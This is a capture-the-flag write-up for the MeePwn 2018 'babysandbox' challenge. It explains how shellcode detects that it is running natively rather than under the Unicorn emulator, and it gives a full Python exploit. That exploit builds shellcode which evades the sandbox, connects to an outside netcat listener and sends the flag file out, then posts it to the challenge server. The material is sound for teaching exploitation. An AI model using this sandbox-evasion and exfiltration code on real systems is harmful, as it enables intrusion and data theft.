There are already some good writeups: https://ctftime.org/task/6287 We wanted
you to show a (what we think) short and elegant solution that also uses
`pwnlib.shellcraft` because we are lazy :) The main idea behind the solution
is that we wanted to find out, if we are running within unicorn or within the
native binary `bin`. The unicorn code in `app.py`
(https://github.com/ssspeedgit00/CTF/blob/master/2018/meepwn/babysandbox/app.py)
filters certian syscalls so that we cannot just write normal shellcode. If we
could pass the unicorn test and then execute arbitrary shellcode... this would
be nice :) With `gdb` you can break in `bin` at the `call eax` instruction and
"look around" how registers or the stack looks. unicorn cannot know how this
looks and thus cannot initialize all registers or prepare the stack and so on,
so that it would look like a native execution (unicorn does not know the `bin`
binary). Long story short: we had a look at the `ecx` register and saw with
`gdb` that it is set to `0x100`. So we wrote a little bit of assembler code
that tests for that value. If it is the same then we are executed natviely
(`bin`) otherwise we are running within unicorn. With `pwnlib.shellcraft` we
added some code that sends us the content of the file `flag` (which was a good
guess :) ) to a server that we have access to and that was running netcat in
listening mode. Here is the full solution:

```python  
#!/usr/bin/env python2

import base64

import requests  
from pwnlib.asm import asm, context  
from pwnlib import shellcraft

context.update(arch="i386", os="linux")

target_url = "http://178.128.100.75/exploit"

def get_payload():  
   return {  
       "payload": base64.b64encode(  
           asm(  
               "cmp ecx, 0x100\n" +  # if ecx == 0x100 we run in "bin" and NOT in unicorn (sandbox evasion)  
               "jnz loose\n" +  
               shellcraft.i386.linux.connect("1.2.3.4", 55555) +  # we ran a nc -l -p 55555 on a server  
               shellcraft.i386.linux.readfile("flag", "edx") +   # edx contains the socket descriptor from connect(),  
                                                                 # flag is a file (good guess)  
               "loose:\n" +  
               "nop"  # unicorn runs till the end of this code; there must not be any other code after the nop  
           )  
       ).decode()  
   }

def send_payload(payload):  
   return requests.post(  
       target_url,  
       json=payload,  
       # valid session cookie necessary... otherwise flask app will crash :/  
       cookies={"session": "eyJJU0JBRFNZU0NBTEwiOmZhbHNlfQ.DitWFg.q6JRhyuAEIZB64HNjRvCXyMY5EA"}  
   )

def main():  
   response = send_payload(get_payload())  
   print(response.content)

   # nc -l -p 55555 on the server prints:
MeePwnCTF{Unicorn_Engine_Is_So_Good_But_Not_Perfect}

if __name__ == "__main__":  
   main()

```

lolcads